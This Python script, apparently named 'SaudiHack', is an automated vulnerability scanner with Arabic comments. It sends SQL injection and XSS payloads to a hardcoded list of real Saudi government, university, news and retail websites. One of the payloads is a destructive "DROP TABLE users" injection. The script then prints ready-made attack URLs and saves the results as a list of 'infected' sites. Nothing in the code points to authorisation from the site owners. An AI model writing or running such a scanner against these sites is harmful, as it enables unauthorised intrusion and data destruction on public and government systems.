#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة عرض سريع للمواقع المصابة - SaudiHack
"""

import os
import json
import sys
import requests
import socket
import ssl
from datetime import datetime
from urllib.parse import urlparse
import warnings
warnings.filterwarnings('ignore')

class InfectedSitesViewer:
    def __init__(self):
        self.results = []
        self.infected_sites = []
        self.suspicious_indicators = []
        
    def load_existing_results(self):
        """تحميل النتائج السابقة إذا وجدت"""
        result_files = []
        for root, dirs, files in os.walk('.'):
            for file in files:
                if file.endswith('.json') and ('vulnerability' in file.lower() or 'scan' in file.lower() or 'report' in file.lower()):
                    result_files.append(os.path.join(root, file))
        
        all_results = []
        for file_path in result_files:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    
                    # معالجة مختلف أنواع البنية
                    if isinstance(data, list):
                        all_results.extend(data)
                    elif isinstance(data, dict):
                        # البحث عن النتائج في مختلف المفاتيح
                        for key in ['results', 'vulnerabilities', 'sites', 'data']:
                            if key in data and isinstance(data[key], list):
                                all_results.extend(data[key])
                                break
                        else:
                            # إذا كان هناك مصفوفة في أي مفتاح
                            for key, value in data.items():
                                if isinstance(value, list) and value and isinstance(value[0], dict):
                                    all_results.extend(value)
                                    break
                            else:
                                all_results.append(data)
            except Exception as e:
                print(f"خطأ في تحميل {file_path}: {e}")
        
        return all_results

    def check_site_status(self, url):
        """التحقق من حالة الموقع"""
        try:
            # إضافة http:// إذا لم يكن موجوداً
            if not url.startswith(('http://', 'https://')):
                url = f"http://{url}"
            
            response = requests.get(url, timeout=10, verify=False)
            return {
                'url': url,
                'status_code': response.status_code,
                'accessible': True,
                'response_time': response.elapsed.total_seconds(),
                'server': response.headers.get('Server', 'Unknown'),
                'content_length': len(response.content)
            }
        except Exception as e:
            return {
                'url': url,
                'status_code': 0,
                'accessible': False,
                'error': str(e)
            }

    def check_ssl_certificate(self, domain):
        """التحقق من شهادة SSL"""
        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'valid': True,
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'subject': dict(x[0] for x in cert['subject']),
                        'not_before': cert['notBefore'],
                        'not_after': cert['notAfter']
                    }
        except Exception as e:
            return {
                'valid': False,
                'error': str(e)
            }

    def categorize_vulnerabilities(self, vulnerabilities):
        """تصنيف الثغرات حسب الخطورة"""
        categories = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': []
        }
        
        for vuln in vulnerabilities:
            severity = vuln.get('severity', '').lower()
            if severity in categories:
                categories[severity].append(vuln)
            else:
                categories['medium'].append(vuln)
        
        return categories

    def generate_quick_report(self):
        """إنشاء تقرير سريع"""
        print("=" * 80)
        print("🚨 تقرير سريع للمواقع المصابة - SaudiHack")
        print("=" * 80)
        print(f"التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()
        
        if not self.infected_sites:
            print("✅ لم يتم العثور على مواقع مصابة في النتائج الحالية")
            return
        
        print(f"📊 إجمالي المواقع المصابة: {len(self.infected_sites)}")
        print()
        
        # تصنيف المواقع حسب الخطورة
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        
        for site in self.infected_sites:
            vulnerabilities = site.get('vulnerabilities', [])
            categories = self.categorize_vulnerabilities(vulnerabilities)
            
            for severity in severity_counts:
                severity_counts[severity] += len(categories[severity])
        
        print("📈 تصنيف الثغرات حسب الخطورة:")
        print(f"   🔴 خطيرة: {severity_counts['critical']}")
        print(f"   🟠 عالية: {severity_counts['high']}")
        print(f"   🟡 متوسطة: {severity_counts['medium']}")
        print(f"   🟢 منخفضة: {severity_counts['low']}")
        print()
        
        # عرض المواقع المصابة مع روابط الثغرات
        print("🌐 المواقع المصابة مع روابط الثغرات:")
        print("=" * 80)
        
        for i, site in enumerate(self.infected_sites, 1):
            target = site.get('target', site.get('url', 'غير معروف'))
            vulnerabilities = site.get('vulnerabilities', [])
            
            print(f"\n{i}. 🎯 {target}")
            
            # التحقق من حالة الموقع
            status = self.check_site_status(target)
            if status['accessible']:
                print(f"   ✅ متاح (كود الحالة: {status['status_code']})")
            else:
                print(f"   ❌ غير متاح: {status.get('error', 'خطأ غير معروف')}")
            
            # عرض روابط الثغرات
            if vulnerabilities:
                print("   🚨 الثغرات المكتشفة:")
                for j, vuln in enumerate(vulnerabilities, 1):
                    vuln_type = vuln.get('vulnerability', vuln.get('type', 'غير معروف'))
                    severity = vuln.get('severity', 'غير معروف')
                    url = vuln.get('url', '')
                    payload = vuln.get('payload', '')
                    parameter = vuln.get('parameter', '')
                    
                    print(f"      {j}. {vuln_type} ({severity})")
                    
                    if url:
                        print(f"         🔗 الرابط: {url}")
                    
                    if payload:
                        print(f"         💉 الحمولة: {payload}")
                    
                    if parameter:
                        print(f"         📊 المعلمة: {parameter}")
                    
                    # إظهار روابط الاختبار
                    if 'sql' in vuln_type.lower():
                        test_urls = [
                            f"{target}/?id=1'",
                            f"{target}/?id=1' OR '1'='1",
                            f"{target}/?search=test'"
                        ]
                        print(f"         🧪 روابط اختبار SQL:")
                        for test_url in test_urls:
                            print(f"            - {test_url}")
                    
                    elif 'xss' in vuln_type.lower():
                        test_urls = [
                            f"{target}/?search=<script>alert('XSS')</script>",
                            f"{target}/?q=<img src=x onerror=alert('XSS')>"
                        ]
                        print(f"         🧪 روابط اختبار XSS:")
                        for test_url in test_urls:
                            print(f"            - {test_url}")
                    
                    print()
            
            print("-" * 80)

    def check_common_vulnerabilities(self, target):
        """التحقق السريع من الثغرات الشائعة"""
        vulnerabilities = []
        
        try:
            # التحقق من ثغرات SQL Injection
            sql_payloads = ["'", "' OR '1'='1", "'; DROP TABLE users; --"]
            
            for payload in sql_payloads:
                test_url = f"{target}?id={payload}"
                try:
                    response = requests.get(test_url, timeout=5, verify=False)
                    if any(error in response.text.lower() for error in ['mysql', 'postgresql', 'sqlite', 'oracle', 'sql error']):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'high',
                            'url': test_url
                        })
                        break
                except:
                    pass
            
            # التحقق من ثغرات XSS
            xss_payload = "<script>alert('XSS')</script>"
            try:
                response = requests.get(f"{target}?search={xss_payload}", timeout=5, verify=False)
                if xss_payload in response.text:
                    vulnerabilities.append({
                        'type': 'XSS',
                        'severity': 'medium',
                        'url': target
                    })
            except:
                pass
            
        except Exception as e:
            pass
        
        return vulnerabilities

    def scan_suspicious_sites(self):
        """مسح المواقع السعودية الشائعة للاختبار"""
        suspicious_domains = [
            # مواقع حكومية سعودية
            "www.saudi.gov.sa",
            "www.mofa.gov.sa",
            "www.moh.gov.sa",
            "www.moe.gov.sa",
            "www.mci.gov.sa",
            "www.gosi.gov.sa",
            "www.absher.sa",
            "www.nafez.sa",
            
            # مواقع إخبارية سعودية
            "www.spa.gov.sa",
            "www.alarabiya.net",
            "www.akhbaar24.com",
            "www.sabq.org",
            
            # مواقع تعليمية وخدماتية
            "www.kau.edu.sa",
            "www.ksu.edu.sa",
            "www.kfupm.edu.sa",
            "www.seu.edu.sa",
            
            # مواقع تجارية سعودية
            "www.jarir.com",
            "www.extra.com",
            "www.souq.com",
            "www.noon.com",
            
            # مواقع مناطق سعودية
            "www.jazan.gov.sa",
            "www.makkah.gov.sa",
            "www.madinah.gov.sa",
            "www.eastern.gov.sa",
            "www.riyadh.gov.sa",
            "www.jeddah.gov.sa"
        ]
        
        print("🔍 جاري فحص المواقع السعودية الشائعة...")
        print()
        
        for domain in suspicious_domains:
            print(f"فحص: {domain}")
            
            # التحقق من حالة الموقع
            status = self.check_site_status(domain)
            
            # التحقق من الثغرات
            vulnerabilities = self.check_common_vulnerabilities(f"http://{domain}")
            
            if vulnerabilities or not status['accessible']:
                site_info = {
                    'target': domain,
                    'status': status,
                    'vulnerabilities': vulnerabilities,
                    'scan_date': datetime.now().isoformat()
                }
                self.infected_sites.append(site_info)
                
                if vulnerabilities:
                    print(f"   ⚠️  تم العثور على ثغرات!")
                else:
                    print(f"   ❌ الموقع غير متاح")
            else:
                print(f"   ✅ الموقع آمن")
        
        print()

    def save_quick_report(self):
        """حفظ التقرير السريع"""
        filename = f"infected_sites_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report_data = {
            'scan_date': datetime.now().isoformat(),
            'total_infected': len(self.infected_sites),
            'sites': self.infected_sites,
            'summary': {
                'total_sites': len(self.infected_sites),
                'accessible_sites': len([s for s in self.infected_sites if s['status']['accessible']]),
                'sites_with_vulnerabilities': len([s for s in self.infected_sites if s['vulnerabilities']])
            }
        }
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report_data, f, indent=2, ensure_ascii=False)
            print(f"💾 تم حفظ التقرير في: {filename}")
        except Exception as e:
            print(f"❌ خطأ في حفظ التقرير: {e}")

    def run(self):
        """تشغيل الأداة"""
        print("🚀 بدء تشغيل أداة عرض المواقع المصابة...")
        print()
        
        # تحميل النتائج السابقة
        existing_results = self.load_existing_results()
        if existing_results:
            print(f"📁 تم العثور على {len(existing_results)} نتيجة سابقة")
            # تصفية النتائج المصابة
            for result in existing_results:
                if 'vulnerabilities' in result and result['vulnerabilities']:
                    self.infected_sites.append(result)
        
        # مسح المواقع المشبوهة
        self.scan_suspicious_sites()
        
        # إنشاء التقرير
        self.generate_quick_report()
        
        # حفظ التقرير
        self.save_quick_report()
        
        print()
        print("✅ اكتمل عرض المواقع المصابة بنجاح!")

def main():
    """الدالة الرئيسية"""
    try:
        viewer = InfectedSitesViewer()
        viewer.run()
    except KeyboardInterrupt:
        print("\n❌ تم إيقاف الأداة بواسطة المستخدم")
    except Exception as e:
        print(f"❌ خطأ غير متوقع: {e}")

if __name__ == "__main__":
    main()